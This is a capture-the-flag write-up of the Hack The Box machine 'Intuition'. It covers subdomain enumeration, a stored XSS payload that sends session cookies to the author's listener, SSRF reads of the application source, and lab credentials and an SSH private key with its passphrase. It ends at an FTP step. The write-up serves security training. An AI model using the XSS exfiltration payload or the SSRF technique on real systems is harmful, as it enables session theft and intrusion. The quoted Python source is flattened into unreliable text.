---
title: HTB - Intuition
date: 2024-09-15 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [htb,ssrf, CVE-2023-24329, Ansible, ReverseEngineering, AuthenticationBypass]
comments: false
---


## Common Enumeration 

Intuition HTB machine, a hard-rated Linux machine. It involved exploiting an SSRF vulnerability in a web application to gain access to a hidden SSH private key and then utilising an authentication bypass flaw in a custom Ansible runner to elevate privileges to root

### Namp

I used the command `sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.15 --open`, which basically tells Nmap to scan all ports, check for services, and spit out a detailed report in the `recon` folder

- SSH - 22
- HTTP - 80

```bash
$ sudo nmap -p- -sC -sV -oA recon/allport 10.10.11.15 --open
[sudo] password for ctf: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 14:28 AEST
Nmap scan report for 10.10.11.15
Host is up (0.0051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://comprezzor.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.56 seconds
```

The HTTP - 80 redirected to `http://comprezzor.htb/`, so I added that to my `/etc/hosts`
### Gobuster / FFUF

FFUF found a couple of juicy subdomains: `auth`, `report`, and `dashboard`

```bash
$ ffuf -u http://10.10.11.15 -H "Host: FUZZ.comprezzor.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.15
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.comprezzor.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

auth                    [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 8ms]
report                  [Status: 200, Size: 3166, Words: 1102, Lines: 109, Duration: 8ms]
dashboard               [Status: 302, Size: 251, Words: 18, Lines: 6, Duration: 12ms]
:: Progress: [4989/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Next, I added those subdomains to my `/etc/hosts` file

```text
10.10.11.15     comprezzor.htb report.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb
```

I ran the Gobuster at `comprezzor.htb` and `report.comprezzor.htb`, but didn't find anything interesting

```bash
 gobuster dir -u http://auth.comprezzor.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://auth.comprezzor.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2876]
/register             (Status: 200) [Size: 2769]
/logout               (Status: 500) [Size: 265]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

But it did found `/backup` directory on `dashboard.comprezzor.htb`

```bash
$ gobuster dir -u http://dashboard.comprezzor.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o recon/gobuster.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dashboard.comprezzor.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 302) [Size: 251] [--> http://auth.comprezzor.htb/login]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

## Website - 80

The website `http://comprezzor.htb/`, was a simple LZMA compression service. You could upload text, PDFs, or Word documents, and it'd compress them. Interesting, but not too exciting at first glance


![img](/assets/img/Intuition/1.webp)

At at the bottom of the page: a contact section with an email address `support@comprezzor.htb` and a link to a `Report a Bug` page, redirecting to `http://report.comprezzor.htb/`

![img](/assets/img/Intuition/2.webp)
### Report Submission

Clicking on that "Report a Bug" link took me to `http://auth.comprezzor.htb`. No surprise there – a typical login page

![img](/assets/img/Intuition/4.webp)

It also had a handy "Register" button

![img](/assets/img/Intuition/5.webp)

### Creating the account

Next, I registered with the ID `z3r0da:password` and a simple password. After logging in, I clicked on "Report a Bug" again, and it led me to a "Report Submission Form" page

![img](/assets/img/Intuition/6.webp)

My immediately through of XSS - can you grep a cookie. I thought, Could we inject code into this report submission form and grab a cookie?
## XSS - Cookie

I created a simple XSS payload

```bash
<img src=# onerror="fetch('http://10.10.14.8:8000/?cookie='+document.cookie);" />
```

This payload send the cookie to my local server running on port 8000

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.15 - - [29/Jun/2024 16:43:24] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1" 200 -
```

After replacing the cookie, I navigated to `http://dashboard.comprezzor.htb/`
### Dashboard - webdev

The `webdev` dashboard wasn't particularly thrilling

![img](/assets/img/Intuition/7.webp)

But it did allow me to view and manage bug reports, setting their priority, deleting them, and even marking them as resolved

![img](/assets/img/Intuition/8.webp)

So, I decided to see what would happen if I resubmitted a report. To my surprise, the `adam` user appeared for a few minutes, but then vanished after a refresh!

![img](/assets/img/Intuition/9.webp)

My hacker senses tingled. Could I use the same trick to grab `admin`'s cookie? I submitted another report with the same XSS payload

```bash
<img src=# onerror="fetch('http://10.10.14.8:8000/?cookie='+document.cookie);" />
```

Then I changed the priority of the report to see if that triggered anything

![img](/assets/img/Intuition/10.webp)

And boom, a new cookie appeared!

```bash
10.10.11.15 - - [29/Jun/2024 17:22:48] "GET /?cookie=user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 HTTP/1.1" 200
```

I replaced my cookie with this new one, and boom, I got access to the `Dashboard - admin`
### Dashboard - admin

The admin dashboard had a few interesting endpoints:

- /list_reports
- /backup
- /create_pdf_report

![img](/assets/img/Intuition/11.webp)

#### Create pdf report

The `/create_pdf_report` endpoint caught my eye. You could provide a URL, and it would generate a PDF report. SSRF vibes, anyone?

![img](/assets/img/Intuition/12.webp)

After downloading the PDF, I ran `exiftool` to check the metadata

```bash
$ exiftool report_37757.pdf 
ExifTool Version Number         : 12.76
File Name                       : report_37757.pdf
Directory                       : .
File Size                       : 8.0 kB
File Modification Date/Time     : 2024:06:29 17:37:22+10:00
File Access Date/Time           : 2024:06:29 17:37:22+10:00
File Inode Change Date/Time     : 2024:06:29 17:37:22+10:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 5.15.2
Create Date                     : 2024:06:29 07:36:48Z
Page Count                      : 1
```

Aha! It was using `wkhtmltopdf 0.12.6`
## SSRF

A quick Google search led me to [CVE-2023-24329](https://www.suse.com/security/cve/CVE-2023-24329.html) it allows attackers to bypass blocklisting methods by providing a URL that starts with `blank` characters

### PoC - SSRF

First, I tried a classic: `file:///etc/passwd`. And guess what? It worked!

![img](/assets/img/Intuition/13.webp)

Next, I tried `file:///proc/self/cmdline`, which shows the command line arguments of the currently running process. This is a handy way to get a glimpse of what's going on under the hood

![img](/assets/img/Intuition/14.webp)

Next, I went for `file:///app/code/app.py`

```python
from flask import Flask, request, redirect from blueprints.index.index import main_bp from blueprints.report.report
import report_bp from blueprints.auth.auth import auth_bp from blueprints.dashboard.dashboard import dashboard_bp
app = Flask(__name__) app.secret_key = "7ASS7ADA8RF3FD7" app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024 # Limit file size to 5MB ALLOWED_EXTENSIONS = {'txt','pdf', 'docx'} # Add more allowed file extensions if needed app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report') app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard') if __name__ == '__main__': app.run(debug=False, host="0.0.0.0", port=80)
```

The code also shows the structure of the application

```text
 file:///app/code/blueprints/index/index.py
 file:///app/code/blueprints/report/report.py
 file:///app/code/blueprints/auth/auth.py
 file:///app/code/blueprints/dashboard/dashboard.py
```

#### Index.py

This code seems to handle the main website functionalities, including file uploads, compression, and download

```python
import os from flask
import Flask, Blueprint, request, render_template, redirect, url_for, flash, send_file from
werkzeug.utils
import secure_filename
import lzma app = Flask(__name__) app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024# Limit file size to 5 MB UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {
    'txt', 'pdf', 'docx'
}#
Add more allowed file extensions
if needed main_bp = Blueprint('main_bp', __name__, template_folder = './templates/')
def allowed_file(filename): return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@ main_bp.route('/', methods = ['GET', 'POST']) def index(): if request.method == 'POST': if 'file'
not in request.files:
    flash('No file part', 'error') return redirect(request.url) file = request.files['file']
if file.filename == '': flash('No selected
        file ', '
        error ') return redirect(request.url) if not allowed_file(file.filename): flash('
        Invalid file extension.Allowed extensions: txt, pdf, docx ', '
        error ') return redirect(request.url) if file and allowed_file(file.filename): filename =
        secure_filename(file.filename) uploaded_file = os.path.join(app.root_path, UPLOAD_FOLDER, filename) file.save(uploaded_file) print(uploaded_file) flash('File successfully compressed!', 'success') with open(uploaded_file,
            'rb') as f_in: with lzma.open(os.path.join(app.root_path, UPLOAD_FOLDER, f "{filename}.xz"), 'wb') as f_out:
        f_out.write(f_in.read()) compressed_filename = f "{filename}.xz"
        file_to_send = os.path.join(app.root_path,
            UPLOAD_FOLDER, compressed_filename) response = send_file(file_to_send, as_attachment = True, download_name = f " {
                filename
            }.xz ", mimetype="
            application / x - xz ") os.remove(uploaded_file) os.remove(file_to_send) return response return
            redirect(url_for('main_bp.index')) return render_template('index/index.html')
```
#### Report.py

This code manages the "Report a Bug" functionality, allowing users to submit reports and administrators to manage them

```python
from flask
import Blueprint, render_template, request, flash, url_for, redirect from.report_utils
import * from
blueprints.auth.auth_utils
import deserialize_user_data from blueprints.auth.auth_utils
import admin_required,
login_required report_bp = Blueprint("report", __name__, subdomain = "report")@ report_bp.route("/", methods = ["GET"]) def report_index(): return render_template("report/index.html")@ report_bp.route("/report_bug", methods = ["GET", "POST"])@ login_required def report_bug(): if request.method == "POST": user_data =
    request.cookies.get("user_data") user_info = deserialize_user_data(user_data) name = user_info["username"]
report_title = request.form["report_title"] description = request.form["description"]
if add_report(name, report_title,
    description): flash("Bug report submitted successfully! Our team will be checking on this shortly.", "success", )
else :
    flash("Error occured while trying to add the report!", "error") return redirect(url_for("report.report_bug")) return
render_template("report/report_bug_form.html")@ report_bp.route("/list_reports")@ login_required@ admin_required
def list_reports(): reports = get_all_reports() return render_template("report/report_list.html", reports = reports)@ report_bp.route("/report/")@ login_required@ admin_required def report_details(report_id): report =
    get_report_by_id(report_id) print(report) if report: return render_template("report/report_details.html", report = report)
else :flash("Report not found!", "error") return redirect(url_for("report.report_index"))@ report_bp.route("/about_reports", methods = ["GET"]) def about_reports(): return
render_template("report/about_reports.html")
```
#### Auth.py

This code handles user authentication, allowing users to register and log in

```python
from flask
import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response from.auth_utils
import * from werkzeug.security
import check_password_hash app = Flask(__name__) auth_bp = Blueprint('auth',
    __name__, subdomain = 'auth')@ auth_bp.route('/') def index(): return redirect(url_for('auth.login'))@ auth_bp.route('/login', methods = ['GET', 'POST']) def login(): if request.method == 'POST': username =
    request.form['username'] password = request.form['password'] user = fetch_user_info(username) if (user is None) or
not check_password_hash(user[2], password): flash('Invalid username or password', 'error') return
redirect(url_for('auth.login')) serialized_user_data = serialize_user_data(user[0], user[1], user[3]) flash('Logged in
    successfully!', '
    success ') response = make_response(redirect(get_redirect_url(user[3]))) response.set_cookie('
    user_data ',
    serialized_user_data, domain = '.comprezzor.htb') return response
return render_template('auth/login.html')@ auth_bp.route('/register', methods = ['GET', 'POST']) def register(): if request.method == 'POST': username =
    request.form['username'] password = request.form['password'] user = fetch_user_info(username) if user is not None:
    flash('User already exists', 'error') return redirect(url_for('auth.register')) if create_user(username, password):
    flash('Registration successful! You can now log in.', 'success') return redirect(url_for('auth.login'))
else :
    flash('Unexpected error occured while trying to register!', 'error') return render_template('auth/register.html')@ auth_bp.route('/logout') def logout(): pass
```
#### Dashboard.py

This is the admin dashboard code. It handles various admin functions, including managing reports, creating PDF reports, and backing up the application it gives us the FTP credentials: `ftp_admin` and `u3jai8y71s2`. I quickly ran Nmap to see if the FTP port was open, but it was closed 

```python
from flask
import Blueprint, request, render_template, flash, redirect, url_for, send_file from blueprints.auth.auth_utils
import admin_required, login_required, deserialize_user_data from
blueprints.report.report_utils
import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report
import random, os, pdfkit, socket, shutil
import urllib.request from urllib.parse
import urlparse
import zipfile from ftplib
import FTP from datetime
import datetime dashboard_bp = Blueprint('dashboard', __name__,
    subdomain = 'dashboard') pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports') allowed_hostnames = ['report.comprezzor.htb']@ dashboard_bp.route('/', methods = ['GET'])@ admin_required def dashboard(): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] == 'admin': reports = get_report_by_priority(1)
elif user_info['role'] == 'webdev': reports = get_all_reports() return render_template('dashboard/dashboard.html', reports = reports, user_info = user_info)@ dashboard_bp.route('/report/',
    methods = ['GET'])@ login_required def get_report(report_id): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] in ['admin', 'webdev']:
    report = get_report_by_id(report_id) return render_template('dashboard/report.html', report = report, user_info = user_info)
else :pass@ dashboard_bp.route('/delete/', methods = ['GET'])@ login_required def del_report(report_id): user_data = request.cookies.get('user_data') user_info = deserialize_user_data(user_data) if user_info['role'] in ['admin', 'webdev']: report =
    delete_report(report_id) return redirect(url_for('dashboard.dashboard'))
else :pass@ dashboard_bp.route('/resolve', methods = ['POST'])@ login_required def resolve(): report_id =
    int(request.args.get('report_id')) if resolve_report(report_id): flash('Report resolved successfully!', 'success')
else :flash('Error occurred while trying to resolve!', 'error') return
redirect(url_for('dashboard.dashboard'))@ dashboard_bp.route('/change_priority', methods = ['POST'])@ admin_required def change_priority(): user_data = request.cookies.get('user_data')
user_info = deserialize_user_data(user_data) if user_info['role'] != ('webdev'
    or 'admin'): flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error') return
redirect(url_for('dashboard.dashboard')) report_id = int(request.args.get('report_id')) priority_level = int(request.args.get('priority_level')) if change_report_priority(report_id, priority_level):
    flash('Report priority level changed!', 'success')
else :flash('Error occurred while trying to change the priority!', 'error') return redirect(url_for('dashboard.dashboard'))@ dashboard_bp.route('/create_pdf_report', methods = ['GET', 'POST'])@ admin_required def create_pdf_report(): global pdf_report_path
if request.method == 'POST': report_url =
    request.form.get('report_url') try: scheme = urlparse(report_url).scheme hostname = urlparse(report_url).netloc
try: dissallowed_schemas = ["file", "ftp", "ftps"]
if (scheme not in
    dissallowed_schemas) and((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or(hostname in allowed_hostnames)): print(scheme) urllib_request = urllib.request.Request(report_url,
        headers = {
            'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM
            response = urllib.request.urlopen(urllib_request) html_content = response.read().decode('utf-8') pdf_filename = f '{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
            pdfkit.from_string(html_content, pdf_filename) return send_file(pdf_filename, as_attachment = True) except: flash('Unexpected error!', 'error') return
            render_template('dashboard/create_pdf_report.html') else: flash('Invalid URL', 'error') return render_template('dashboard/create_pdf_report.html') except Exception as e: raise e
            else :return
            render_template('dashboard/create_pdf_report.html')@ dashboard_bp.route('/backup', methods = ['GET'])@ admin_required def backup(): source_directory =
                os.path.abspath(os.path.dirname(__file__) + '../../../') current_datetime = datetime.now().strftime("%Y%m%d%H%M%S") backup_filename = f 'app_backup_{current_datetime}.zip'
            with
            zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf: for root,
            _,
            files in os.walk(source_directory): for file in files: file_path = os.path.join(root, file) arcname =
                os.path.relpath(file_path, source_directory) zipf.write(file_path, arcname = arcname) try: ftp = FTP('ftp.local') ftp.login(user = 'ftp_admin', passwd = 'u3jai8y71s2') ftp.cwd('/') with
            open(backup_filename, 'rb') as file: ftp.storbinary(f 'STOR {backup_filename}', file) ftp.quit() os.remove(backup_filename) flash('Backup and upload completed successfully!', 'success') except
            Exception as e: flash(f 'Error: {str(e)}', 'error') return redirect(url_for('dashboard.dashboard'))
```

Remember that SSRF vulnerability? Maybe we can use it to make a sneaky FTP connection

### FTP Login

I found a few interesting files:

- **private-8297.key:** An SSH private key!
- **welcome_note.pdf:** A PDF document.
- **welcome_note.txt:** A text file.

![img](/assets/img/Intuition/15.webp)

#### Private-8297.key

SSH private key

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
XxwXArPr6+HQe9hZSjI2hjYC2OU=
-----END OPENSSH PRIVATE KEY-----
```

#### Welcome_note.txt

Passphrase: `Y27SH19HDIWD`

```text
Dear Devs, We are thrilled to extend a warm welcome to you as you embark on this exciting journey with us. Your arrival marks the beginning of an inspiring chapter in our collective pursuit of excellence, and we are genuinely delighted to have you on board. Here, we value talent, innovation, and teamwork, and your presence here reaffirms our commitment to nurturing a diverse and dynamic workforce. Your skills, experience, and unique perspectives are invaluable assets that will contribute significantly to our continued growth and success. As you settle into your new role, please know that you have our unwavering support. Our team is here to guide and assist you every step of the way, ensuring that you have the resources and knowledge necessary to thrive in your position. To facilitate your work and access to our systems, we have attached an SSH private key to this email. You can use the following passphrase to access it, `Y27SH19HDIWD`. Please ensure the utmost confidentiality and security when using this key. If you have any questions or require assistance with server access or any other aspect of your work, please do not hesitate to reach out for assistance. In addition to your technical skills, we encourage you to bring your passion, creativity, and innovative thinking to the table. Your contributions will play a vital role in shaping the future of our projects and products. Once again, welcome to your new family. We look forward to getting to know you, collaborating with you, and witnessing your exceptional contributions. Together, we will continue to achieve great things. If you have any questions or need further information, please feel free to me at adam@comprezzor.htb. Best regards, Adam
```

## SSH dev

Decrypted the ssh private key

```bash
$ ssh-keygen -p -f id_rsa 
Enter old passphrase: 
Key has comment 'dev_acc@local'
Enter new passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved with the new passphrase.
```

### Shell as Dev

I was now logged in as the `dev_acc` user and got the user.txt

```bash
dev_acc@intuition:~$ whoami
dev_acc
dev_acc@intuition:~$ ls -la
total 28
drwxr-x--- 4 dev_acc dev_acc 4096 Apr  9 18:26 .
drwxr-xr-x 5 root    root    4096 Apr 25 11:49 ..
lrwxrwxrwx 1 root    root       9 Apr  9 18:26 .bash_history -> /dev/null
-rw-r--r-- 1 dev_acc dev_acc 3771 Sep 17  2023 .bashrc
drwx------ 2 dev_acc dev_acc 4096 Apr  4 16:21 .cache
-rw-r--r-- 1 dev_acc dev_acc  807 Sep 17  2023 .profile
drwx------ 2 dev_acc dev_acc 4096 Oct  8  2023 .ssh
-rw-r----- 1 root    dev_acc   33 Jun 29 04:28 user.txt
dev_acc@intuition:~$ cat user.txt 
0d41f75....
```

user.txt

```text
0d41f75....
```

### Enumerating app directory

First, I decided to take a closer look at the `auth` it handles user authentication, but might hold clues to gaining more privileges

```bash
dev_acc@intuition:/var/www/app/blueprints/auth$ ls -la
total 40
drwxr-xr-x 3 root root  4096 Jun 29 10:40 .
drwxr-xr-x 6 root root  4096 Apr 10 08:21 ..
-rw-r--r-- 1 root root  1842 Sep 18  2023 auth.py
-rw-r--r-- 1 root root  3038 Sep 19  2023 auth_utils.py
drwxr-xr-x 2 root root  4096 Apr 10 08:21 __pycache__
-rw-r--r-- 1 root root 16384 Jun 29 10:40 users.db
-rw-r--r-- 1 root root   171 Sep 18  2023 users.sql
dev_acc@intuition:/var/www/app/blueprints/auth$ 
```

And there I found a `users.db` file and a `users.sql` file. I opened `users.db` using SQLite and found two user accounts

```bash
dev_acc@intuition:/var/www/app/blueprints/auth$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> select * from users;
1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
sqlite> 
```

Looks like an admin account and a webdev account! I grabbed the hash for the `adam` account and threw it at Hashcat

```bash
$ hashcat hash /usr/share/wordlists/rockyou.txt --force
....snip....
Restore.Point....: 6979584/14344385 (48.66%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: jlhughes20 -> jkr46bxm

sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
```

Boom! The password for the `adam` account is `adam gray`. I tried to log in using SSH, but it didn't work

```bash
dev_acc@intuition:~$ su adam
Password: 
su: Authentication failure
```

### FTP

I decided to check the FTP server, and I found a directory called `backup`

```bash
dev_acc@intuition:~$ ftp adam@127.0.0.1
Connected to 127.0.0.1.
220 pyftpdlib 1.5.7 ready.
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering extended passive mode (|||57243|).
125 Data connection already open. Transfer starting.
drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
226 Transfer complete.
ftp> 
```

Inside the `backup` directory, I found a directory called `runner1`. 

- run-tests.sh
- runner1
- runner1.c

```bash
ftp> ls
229 Entering extended passive mode (|||32965|).
150 File status okay. About to open data connection.
drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
226 Transfer complete.
ftp> cd runner1
250 "/backup/runner1" is the current directory.
ftp> ls
229 Entering extended passive mode (|||45563|).
125 Data connection already open. Transfer starting.
-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
226 Transfer complete.
ftp> 
```

I downloaded the `runner1` executable and the source code, `runner1.c`

```bash
....snip....
